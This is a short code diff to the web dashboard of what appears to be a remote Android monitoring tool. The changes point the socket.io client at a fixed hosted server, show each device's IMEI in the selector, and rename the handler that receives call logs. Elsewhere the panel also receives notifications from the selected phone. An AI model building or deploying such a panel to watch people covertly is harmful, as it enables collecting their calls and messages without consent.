@@ -1,10 +1,6 @@
-// Dynamic IP detection based on environment
+// Fixed server URL
 function getServerURL() {
-  const hostname = window.location.hostname;
-  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
-    return 'http://localhost:3000';
-  }
-  return `http://${hostname}:3000`;
+  return 'https://tom-b4wk.onrender.com';
 }
 
 const socket = io(getServerURL(), {
@@ -69,7 +65,7 @@ function updateClientSelector() {
   connectedAndroidClients.forEach(client => {
     const option = document.createElement('option');
     option.value = client.id;
-    option.textContent = `Device ${client.id.substring(0, 8)} (${client.address})`;
+    option.textContent = `Device ${client.id.substring(0, 8)} (${client.address}) - IMEI: ${client.deviceId || 'N/A'}`;
     if (client.id === selectedAndroidClientId) {
       option.selected = true;
     }
@@ -268,7 +264,7 @@ socket.on('notification', data => {
   }
 });
 
-socket.on('call-log', data => {
+socket.on('call_log', data => {
   if (data.from === selectedAndroidClientId) {
     logDebug(`Received call log from ${data.from}`);
     if (data.call_logs) {
